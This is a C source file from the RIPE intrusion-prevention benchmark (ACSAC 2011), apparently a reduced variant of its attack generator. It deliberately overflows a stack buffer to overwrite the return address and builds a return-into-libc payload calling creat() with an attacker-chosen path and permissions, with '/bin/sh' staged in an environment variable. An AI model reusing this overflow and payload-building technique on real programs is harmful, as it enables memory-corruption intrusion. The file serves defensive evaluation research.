/* RIPE was originally developed by John Wilander (@johnwilander)
 * and was debugged and extended by Nick Nikiforakis (@nicknikiforakis)
 *
 * Released under the MIT license (see file named LICENSE)
 *
 * This program is part the paper titled
 * RIPE: Runtime Intrusion Prevention Evaluator 
 * Authored by: John Wilander, Nick Nikiforakis, Yves Younan,
 *              Mariam Kamkar and Wouter Joosen
 * Published in the proceedings of ACSAC 2011, Orlando, Florida
 *
 * Please cite accordingly.
 */

#include "ripe_attack_generator.h"

static char cf_ret_param[] = "/tmp/rip-eval/f_xxxx";
static int fake_esp_jmpbuff[15] = {0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,
0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,
0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,&exit, &cf_ret_param,448}; //448 => 0700 mode

/* DATA SEGMENT TARGETS */
 /* Target: Longjump buffer in data segment                                */
 /* Declared after injection buffers to place it "after" on the data seg   */
static jmp_buf data_jmp_buffer = {0, 0, 0, 0, 0, 0};

//NN: Moved away of harm's way (aka overflowing buffers in the data segment)
// static char loose_change1[128];      //NN Sandwich the control vars
static boolean output_error_msg = TRUE;
static ATTACK_FORM attack;
// static char loose_change2[128];      //NN Sandwich the control vars

// static int rop_sled[7] = {&gadget1 + 62,0xFFFFFFFF,&gadget2 + 62,&cf_ret_param,0xFFFFFFFF,&gadget3 + 62, &exit};

int fooz(char *a, int b){
  int zz,ff;

  zz =a ;
  ff = b;

  printf("Fooz was called");
  return 1;
}

/**********/
/* MAIN() */
/**********/
int main(int argc, char **argv) {
  int option_char;
  int i = 0;
  FILE *output_stream;
  jmp_buf stack_jmp_buffer_param;

  //NN: Add provisioning for when 00 are in the address of the jmp_buffer_param
  jmp_buf stack_jmp_buffer_param_array[512];

  for(i=0; i < 512; i++){
  if(!contains_terminating_char(stack_jmp_buffer_param_array[i]))
    break;
  }
  if (i == 512){
    printf("Error. Can't allocate appropriate stack_jmp_buffer\n");
     exit(1);
  }

  setenv("param_to_system", "/bin/sh", 1);
  setenv("param_to_creat", "/tmp/rip-eval/f_xxxx",1); //NN

  /* Check if attack form is possible */
  perform_attack(output_stream, &dummy_function, stack_jmp_buffer_param_array[i]);
}


//Data Segment Attack vectors where here
//but they were moved to the top of the file
//so that they won't overflow into control variables

//reliable ways to get the adresses of the return address and old base pointer
#define OLD_BP_PTR   __builtin_frame_address(0)
#define RET_ADDR_PTR ((void**)OLD_BP_PTR + 1)

/********************/
/* PERFORM_ATTACK() */
/********************/
void perform_attack(FILE *output_stream,
        int (*stack_func_ptr_param)(const char *),
        jmp_buf stack_jmp_buffer_param) {

  /* STACK TARGETS */
  /* Target: Longjump buffer on stack                                       */
  /* Declared before injection buffers to place it "below" on the stack     */
  jmp_buf stack_jmp_buffer;
  /* Target: Function pointer on stack                                      */
  /* Declared before injection buffers to place it "below" on the stack     */
  int (*stack_func_ptr)(const char *);
  /* Target: Pointer on stack for indirect attack                           */
  /* Declared before injection buffers to place it "below" on the stack     */
  /* Declared adjacent to the injection buffers, at the top of the stack,   */
  /* so an indirect attack won't overflow the stack target code pointers    */
  /* when overflowing the indirect pointer                                  */
  long *stack_mem_ptr;
  /* Stack buffers to inject into                                           */
  /* Two buffers declared to be able to chose buffer address without NUL    */
  /* Largest buffer declared first since it'll be "below" on the stack      */
 // char stack_buffer1[128];
 // char stack_buffer2[1];

  char stack_buffer[1024];
  //JMP_BUF for indirect attacks
  jmp_buf stack_jmp_buffer_indirect[512];
  struct attackme stack_struct;
  stack_struct.func_ptr = fooz;


  /* Pointer to buffer to overflow */
  char *buffer, *dump_start_addr;
  /* Address to target for direct (part of) overflow */
  void *target_addr;
  /* Buffer for storing a generated format string */
  char format_string_buf[16];
  /* Temporary storage of payload for overflow with fscanf() */
  FILE *fscanf_temp_file;
  CHARPAYLOAD payload;

  /* Storage of debug memory dumps (used for debug output) */
  // MEM_DUMP mem_dump1[DEFAULT_DUMP_SIZE];
  // MEM_DUMP mem_dump2[DEFAULT_DUMP_SIZE];
  // MEM_DUMP payload_dump[DEFAULT_DUMP_SIZE];

  /* Initialize function pointers to point to dummy function so    */
  /* that if the attack fails there will still be code to execute  */
  stack_func_ptr = &dummy_function;

  /***************************************/
  /* Set location for buffer to overflow */
  /***************************************/

  /* Injection into stack buffer                           */
  /* Make sure that we start injecting the shellcode on an */
  /* address not containing any terminating characters     */

  /* NN: Trying addresses until correct */
  buffer = stack_buffer;
  while (contains_terminating_char((unsigned long)buffer)){
    buffer += rand() % 10;
    printf("Trying %p\n",buffer);
  }
  /* Out of Bounds */
  if (buffer > stack_buffer + sizeof(stack_buffer) - 100){
    printf("Error. Couldn't find appropriate buffer on the stack\n");
    exit(1);
  }

  /************************************/
  /* Set target address for overflow, */
  /* (used to calculate payload size) */
  /************************************/
  target_addr = RET_ADDR_PTR;

  /*********************/
  /* Configure payload */
  /*********************/
  payload.ptr_to_correct_return_addr = RET_ADDR_PTR;

  // payload.inject_param = attack.inject_param;
  payload.overflow_ptr = &creat; //NN42 

  /* Calculate payload size for overflow of chosen target address */
  if ((unsigned long)target_addr > (unsigned long)buffer) {
    payload.size =
      (unsigned int)((unsigned long)target_addr + sizeof(long)
         - (unsigned long)buffer
         + 1); /* For null termination so that buffer can be     */
               /* used with string functions in standard library */
     printf("(unsigned long)target_addr : %d\n", (unsigned long)target_addr);
     printf("sizeof(long) : %d\n", sizeof(long));
     printf("(unsigned long)buffer : %d\n", (unsigned long)buffer);
     printf("target_addr == %p\n", target_addr);
     printf("buffer == %p\n", buffer);
     printf("psize == %d\n",payload.size);
     printf("stack_buffer == %p\n", stack_buffer);


  } else {
    if(output_error_msg) {
      printf(
        "Error: Target address is lower than address of overflow buffer.\n");
      printf(
        " Overflow direction is towards higher addresses.\n");
      printf("target_addr == %p\n", target_addr);
      // printf("heap_func_ptr == %p\n", heap_func_ptr);
      printf("buffer == %p\n", buffer);
      printf("payload.size == %d\n", payload.size);
    }
    exit(1); 
  }
  /* Set first byte of buffer to null to allow concatenation functions to */
  /* start filling the buffer from that first byte                        */
  buffer[0] = '\0';

  /*****************/
  /* Build payload */
  /*****************/

  if(!build_payload(&payload)) {
    if(output_error_msg) {
      printf("Error: Could not build payload\n");
    }
    exit(1);
  }

  /****************************************/
  /* Overflow buffer with chosen function */
  /* Note: Here memory will be corrupted  */
  /****************************************/
  printf("size of payload : %d, %d-1=%d\n", payload.size, payload.size, (payload.size - 1));
  homebrew_memcpy(buffer, payload.buffer, payload.size - 1);
}


/*******************/
/* BUILD_PAYLOAD() */
/*******************/
boolean build_payload(CHARPAYLOAD *payload) {
  size_t size_shellcode, bytes_to_pad, i;
  char *shellcode, *temp_char_buffer, *temp_char_ptr;

  if(payload->size < sizeof(long)) {
    return FALSE;
  }
  size_shellcode = 0;
  shellcode = "dummy";

  //at this point, shellcode points to the correct shellcode and shellcode size points
  //to the correct size
  
  /* Allocate payload buffer */

  payload->buffer = (char *)malloc(payload->size);
  if(payload->buffer == NULL) {
    perror("Unable to allocate payload buffer.");
    return FALSE;
  }
  /* Copy shellcode into payload buffer */
  memcpy(payload->buffer, shellcode, size_shellcode);

  /* Calculate number of bytes to pad with */
  /* size - shellcode - target address - null terminator */
  bytes_to_pad =
    (payload->size - size_shellcode - sizeof(long) - sizeof(char));

  /* Pad payload buffer with dummy bytes */
  memset((payload->buffer + size_shellcode), 'A', bytes_to_pad);

  //NN
  printf("\noverflow_ptr: %p\n",payload->overflow_ptr);

  /* ************************************ */
  /* Special case: Build fake stack frame */
  /* ************************************ */
  

  /* Extend the payload to cover two memory addresses beyond the  */
  /* return address and inject a pointer to environment variable  */
  /* containing a "/bin/sh" parameter for return-into-libc attacks*/

  // Extend payload size
  payload->size += (3 * sizeof(long));
  // Allocate new payload buffer
  temp_char_buffer = (char *)malloc(payload->size);
  // Copy current payload to new payload buffer
  memcpy(temp_char_buffer, payload->buffer, payload->size);
  // Copy existing return address to new payload
  memcpy(temp_char_buffer + payload->size - 1 - sizeof(long),
   (payload->ptr_to_correct_return_addr),
   sizeof(long));
  // Free the old payload buffer
  free(payload->buffer);
  // Set the new payload buffer
  payload->buffer = temp_char_buffer;
  
  /* Insert pointer to environment variable containing a          */
  /* "/bin/sh" parameter for return-into-libc attacks             */
  temp_char_ptr = getenv("param_to_creat"); // NN42
  memcpy(&(payload->buffer[payload->size -
         5 -               // NULL terminator
         sizeof(long)]),   // the injected parameter
   &temp_char_ptr,
   sizeof(long));

  //NN42: Inserting the permissions
  memcpy(&(payload->buffer[payload->size - 1 -
         sizeof(long)]),   // the injected parameter
   &fake_esp_jmpbuff[14],
   sizeof(long));
   
  /* Add the address to the direct or indirect target */

  memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
   &payload->overflow_ptr,
   sizeof(long));

  /* Finally, add the terminating null character at the end */
  memset((payload->buffer + payload->size - 1), '\0', 1);

  return TRUE;
}

boolean contains_terminating_char(unsigned long value) {
  size_t i;
  char temp;

  for(i = 0; i < sizeof(long); i++) {
    temp = (char)(value & (unsigned char)-1);
    if(temp == '\0' ||      /* NUL */
       temp == '\r' ||      /* Carriage return */
       temp == '\n' )      /* New line (or Line feed) */
       //temp == (char)0xff)  /* -1 */
      {
  return TRUE;
      }
    // CHAR_BIT declared in limits.h
    value >>= CHAR_BIT;
  }
  return FALSE;
}


void homebrew_memcpy(void *dst, const void *src, size_t length) {
  char *d, *s;

  d = (char *)dst;
  s = (char *)src;

  while(length--) {
    printf("%d\n", length);
    *d++ = *s++;
  }
}
